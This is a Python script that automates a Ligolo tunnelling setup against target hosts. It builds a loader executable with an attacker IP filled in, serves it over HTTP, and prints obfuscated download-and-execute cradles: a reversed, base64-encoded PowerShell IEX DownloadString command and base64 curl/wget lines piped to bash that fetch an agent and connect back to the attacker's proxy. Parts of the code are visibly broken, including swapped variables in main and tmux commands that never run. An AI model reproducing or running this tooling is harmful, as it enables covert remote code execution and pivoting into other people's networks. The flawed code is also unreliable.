import argparse
import subprocess
import re
import os
import shutil
import base64
import psutil
import threading
import time
import base64

def get_tun0_ip():
    # Function to get the IP address of tun0
    result = subprocess.run(['ifconfig', 'tun0'], capture_output=True, text=True)
    match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
    return match.group(1) if match else None

def define_variables():
    # Define IPADDRESS
    ipaddress = get_tun0_ip() or '127.0.0.1'  # Default to loopback address if tun0 IP not found
    
    # Define PROXYPORT
    proxyport = 11601
    
    webport = 80
    # Define OUTPUT_DIR
    output_dir = r'c:\windows\tasks'
    
    return ipaddress, proxyport, webport, output_dir

def parse_arguments():
    parser = argparse.ArgumentParser(description='Script to define variables.')
    parser.add_argument('-ip', dest='ipaddress', type=str, help='Override IPADDRESS')
    parser.add_argument('-port', dest='proxyport', type=int, help='Override PROXYPORT')
    parser.add_argument('-path', dest='output_dir', type=str, help='Override OUTPUT_DIR')
    parser.add_argument('-web', dest='webport', type=int, help='Override WEBPORT')  # Added -web argument
    args = parser.parse_args()
    
    return args

def replace_placeholders(ipaddress, proxyport, output_dir, webport):
    # Define paths
    input_file = os.path.expanduser('~/.local/bin/ligolo/input.txt')
    output_file = os.path.expanduser('~/.local/bin/ligolo/agent_loader/Program.cs')

    # Read input file
    with open(input_file, 'r') as f:
        content = f.read()

    # Replace placeholders
    output_dir = r'c:\windows\tasks'
    content = content.replace('<IPADDRESS>', ipaddress)
    content = content.replace('<PROXYPORT>', str(proxyport))
    content = content.replace('<OUTPUT_DIR>', str(output_dir))
    content = content.replace('<WEBPORT>', str(webport))

    # Write modified content to output file
    with open(output_file, 'w') as f:
        f.write(content)


def build_and_copy_application(project_directory, current_working_dir):
    os.chdir(project_directory)

    # Build the application using xbuild
    xbuild_command = "xbuild /p:Configuration=Release /p:Platform=x64 /property:OutputPath={0}/agent_loader/bin/x64/Release {0}/agent_loader.sln".format(os.path.expanduser('~/.local/bin/ligolo'))
    
    try:
        subprocess.run(xbuild_command, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Ligolo.exe built successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to build the application. Error: {e}")

    # Copy the compiled application file to the correct directory
    source_exe_file = os.path.expanduser('~/.local/bin/ligolo/agent_loader/bin/x64/Release/agent_loader.exe')
    destination_exe_file = os.path.expanduser('~/.local/bin/websrv/ligolo.exe')
    try:
        shutil.copyfile(source_exe_file, destination_exe_file)
    except IOError as e:
        print(f"Failed to copy the application file. Error: {e}")


def update_ligolo_template(ipaddress, webport, current_working_dir):
    # Define the path to the ligolo.txt template
    template_file = os.path.expanduser('~/.local/bin/ligolo/ligolo.txt')
    
    # Read the template file
    with open(template_file, 'r') as f:
        content = f.read()
    
    # Replace the <IPADDRESS> and <WEBPORT> placeholders
    updated_content = content.replace('<IPADDRESS>', ipaddress)
    updated_content = updated_content.replace('<WEBPORT>', str(webport))
    
    # Define the output file path
    output_file = os.path.expanduser('~/.local/bin/websrv/ligolo.txt')
    
    # Write the updated content to the output file
    with open(output_file, 'w') as f:
        f.write(updated_content)

def encode_linux_command_base64(command):
    # Encode Linux command with base64
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    return encoded_command

def encode_powershell_command_utf16(command):
    # Encode PowerShell command with UTF-16
    encoded_command = base64.b64encode(command.encode('utf-16le')).decode('utf-8')
    return f'powershell -enc {encoded_command}'

def manipulate_commands_and_display_text(ipaddress, proxyport, webport):
    # Original PowerShell command
    original_command = "IEX (New-Object Net.WebClient).DownloadString('http://<IPADDRESS>:<WEBPORT>/ligolo.txt')"

    # Update placeholders for IPADDRESS and WEBPORT
    updated_command = original_command.replace('<IPADDRESS>', ipaddress).replace('<WEBPORT>', str(webport))

    # Print the updated command
    print(f"Base Command: \033[90m{updated_command}\033[0m")  # Gray color

    # Reverse the command and prepare it for execution in PowerShell
    reversed_command = ''.join(reversed(updated_command))
    reversed_command = reversed_command.replace("'", "''")  # Escape single quotes

    # Build PowerShell command to reverse and execute the reversed command
    reverse_and_execute_command = (
        f"$reversed = '{reversed_command}'.ToCharArray();[array]::Reverse($reversed);-join $reversed | IEX"
    )

    # Print the reversed and execute command
    print(f"Reversed Command: \033[93m{reverse_and_execute_command}\033[0m")  # Light Blue color

    # Print the DoubleHop command
    double_hop_command = f"DoubleHop: \033[94magent -connect $pivot:$port -ignore-cert\033[0m"
    print(double_hop_command)

    # Generate and print the Linux command with curl
    additional_command_curl = (
        f"curl -o /tmp/tmpbz http://{ipaddress}:{webport}/agent; chmod +x /tmp/tmpbz; "
        "ip a | grep -v '127.0.0.1' | grep -v inet6 | grep inet | awk '{print $2}' | "
        "sed 's/\\(\\([0-9]\\{1,3\\}\\.\\)\\{3\\}\\)[0-9]\\{1,3\\}\\//\\10\\//' | "
        'while read -r i; do echo "\033[93m\nsudo ip route add $i dev ligolo\033[0m"; '
        f"done; echo '\033[38;5;158mDont forget to stop the webserver!!\033[0m'; "
        f"/tmp/tmpbz -connect {ipaddress}:{proxyport} -ignore-cert &"
    )

    # Generate and print the Linux command with wget
    additional_command_wget = (
        f"wget -O /tmp/tmpbz http://{ipaddress}:{webport}/agent; chmod +x /tmp/tmpbz; "
        "ip a | grep -v '127.0.0.1' | grep -v inet6 | grep inet | awk '{print $2}' | "
        "sed 's/\\(\\([0-9]\\{1,3\\}\\.\\)\\{3\\}\\}[0-9]\\{1,3\\}\\//\\10\\//' | "
        'while read -r i; do echo "\033[93msudo ip route add $i dev ligolo\033[0m"; '
        f"done; echo '\033[38;5;158m\nDont forget to stop the webserver!!\033[0m'; "
        f"/tmp/tmpbz -connect {ipaddress}:{proxyport} -ignore-cert &"
    )

    # Encode and display the Linux commands
    encoded_linux_command_curl = encode_linux_command_base64(additional_command_curl)
    encoded_linux_command_wget = encode_linux_command_base64(additional_command_wget)

    print(f"(curl): \033[38;5;138mecho {encoded_linux_command_curl} | base64 -d | bash\033[0m")  # Neon Green color
    print(f"(wget): \033[38;5;158mecho {encoded_linux_command_wget} | base64 -d | bash\033[0m")  # Neon Green color

    # Encode and display the PowerShell command
    encoded_command = encode_powershell_command_utf16(reverse_and_execute_command)
    print(f"(powershell): \033[92m{encoded_command}\033[0m")  # Neon Green color

    # Return the reversed command for potential further use
    return reversed_command



def run_tmux_commands(proxyport):
    session_name = "ligolo"
    
    # Check if the tmux session already exists
    result = subprocess.run(f"tmux has-session -t {session_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    if result.returncode != 0:
        # Session does not exist, create a new one
        subprocess.run(f"tmux new-session -d -s {session_name}", shell=True, check=True)
    
    # Define tmux commands to run
    tmux_commands = []
    
    # Construct tmux command if proxyport is provided
    if proxyport:
        tmux_commands.append(
            f"tmux send-keys -t {session_name} '{os.path.expanduser('~/.local/bin/websrv/proxy')} -selfcert -laddr 0.0.0.0:{proxyport}' Enter"
        )
    else:
        print("Proxy port not provided. Skipping tmux command.")
        return None
    return tmux_commands

    # Run tmux commands
    for cmd in tmux_commands:
        subprocess.run(cmd, shell=True, check=True)

    return session_name


def execute_routing_commands():
    ligolo_user = os.path.basename(os.path.expanduser('~'))
    commands = [
        f"sudo ip tuntap add user {ligolo_user} mode tun ligolo",
        "sudo ip link set ligolo up"
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, check=True, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError as e:
            stderr = e.stderr.decode().strip()
            if "Device or resource busy" in stderr:
                continue
            else:
                print(f"Error executing command {cmd}: {stderr}")

def launch_web_server(current_working_dir, port):
    # Change to the specified directory (~/.local/bin/websrv)
    websrv_dir = os.path.expanduser('~/.local/bin/websrv')
    os.chdir(websrv_dir)

    # Try to start the server on the specified port
    try:
        os.system(f"sudo python3 -m http.server {port}")
    except KeyboardInterrupt:
        print("Server stopped.")

def watch_netstat(proxyport, current_working_dir):
    def check_netstat():
        try:
            # Command to check established connections on the specified proxyport
            netstat_command = f"netstat -tulnap | grep {proxyport} | grep ESTABLISHED"
            result = subprocess.run(netstat_command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0 and "ESTABLISHED" in result.stdout:
                #print(f"Established connection on port {proxyport} found.")
                
                # Simulate sending commands to tmux session
                commands_to_send = [
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo session Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo start Enter",
                    "tmux send-keys -t ligolo Enter",
                    "tmux send-keys -t ligolo ifconfig Enter"
                ]
                
                for cmd in commands_to_send:
                    subprocess.run(cmd, shell=True, check=True)
                
                # Example: Sending more commands or actions as needed
                # subprocess.run(f"tmux send-keys -t ligolo 'session' Enter", shell=True, check=True)
                # subprocess.run(f"tmux send-keys -t ligolo Enter", shell=True, check=True)
                
        except subprocess.CalledProcessError as e:
            print(f"Error checking netstat: {e}")
    
    # Start the monitoring in a separate thread
    netstat_thread = threading.Thread(target=check_netstat)
    netstat_thread.start()

def main():
    args = parse_arguments()
    ipaddress, proxyport, output_dir, webport = define_variables()
    
    # Override default values if arguments are provided
    if args.ipaddress:
        ipaddress = args.ipaddress
    if args.proxyport:
        proxyport = args.proxyport
    if args.output_dir:
        output_dir = args.output_dir
    if args.webport:
        webport = args.webport

    # Replace placeholders in input.txt and save to Program.cs
    replace_placeholders(ipaddress, proxyport, output_dir, webport)

    # Build the application and copy the executable
    project_directory = os.path.expanduser('~/.local/bin/ligolo')
    #current_working_dir = os.getcwd()
    current_working_dir = os.path.expanduser('~/.local/bin/websrv')
    build_and_copy_application(project_directory, current_working_dir)

    # Update ligolo.txt template and write to current working directory
    update_ligolo_template(ipaddress, webport, current_working_dir)  # Pass webport here

    # Manipulate PowerShell and Linux commands with IPADDRESS and PROXYPORT
    manipulate_commands_and_display_text(ipaddress, proxyport, webport)

    # Run tmux commands and return session name
    session_name = run_tmux_commands(proxyport)

    # Execute routing commands
    execute_routing_commands()

    # Launch web server in the current working directory
    launch_web_server(current_working_dir, webport)

    # Watch netstat for established connections on proxyport and create proof file
    watch_netstat(proxyport, current_working_dir)
    
if __name__ == "__main__":
    main()
